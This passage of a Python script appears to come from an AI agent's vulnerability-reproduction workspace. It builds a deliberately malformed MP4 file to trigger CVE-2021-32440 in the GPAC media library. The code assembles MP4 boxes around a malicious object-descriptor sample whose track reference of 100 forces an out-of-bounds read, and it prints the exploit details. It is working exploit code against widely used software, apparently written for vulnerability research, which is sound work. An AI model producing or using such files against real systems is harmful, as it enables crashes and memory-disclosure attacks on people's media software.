""Create track box"""\n    trak_data = create_tkhd(track_id)\n    trak_data += create_tref()  # Add mpod reference\n    trak_data += create_mdia(mdat_offset, sample_data)\n    return write_box(b\'trak\', trak_data)\n\ndef create_moov(mdat_offset, sample_data):\n    """Create movie box"""\n    moov_data = create_mvhd()\n    moov_data += create_trak(1, mdat_offset, sample_data)\n    return write_box(b\'moov\', moov_data)\n\ndef create_mdat(sample_data):\n    """Create media data box"""\n    return write_box(b\'mdat\', sample_data)\n\ndef main():\n    output_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2021-32440/triggering/round5/testcase-round5\'\n    \n    # Create malicious OD sample with trackRef=100 (exceeds array bounds)\n    sample_data = create_malicious_od_sample()\n    \n    # Build the MP4 structure\n    mp4_data = io.BytesIO()\n    \n    # Write ftyp\n    ftyp = create_ftyp()\n    mp4_data.write(ftyp)\n    \n    # Calculate mdat offset (after ftyp + moov)\n    # We need to calculate moov size first\n    temp_moov = create_moov(0, sample_data)\n    moov_size = len(temp_moov)\n    mdat_offset = len(ftyp) + moov_size + 8  # +8 for mdat header\n    \n    # Write moov with correct mdat offset\n    moov = create_moov(mdat_offset, sample_data)\n    mp4_data.write(moov)\n    \n    # Write mdat\n    mdat = create_mdat(sample_data)\n    mp4_data.write(mdat)\n    \n    # Write to file\n    with open(output_path, \'wb\') as f:\n        f.write(mp4_data.getvalue())\n    \n    print(f"[+] Generated malicious MP4 file: {output_path}")\n    print(f"[+] File size: {len(mp4_data.getvalue())} bytes")\n    print(f"[+] OD sample size: {len(sample_data)} bytes")\n    print(f"[+] Malicious trackRef value: 0x0064 (100)")\n    print(f"[+] mpod->trackIDs array has only 2 entries")\n    print(f"[+] This causes OOB read: trackIDs[100-1] = trackIDs[99] >> array bounds")\n\nif __name__ == \'__main__\':\n    main()\n'}
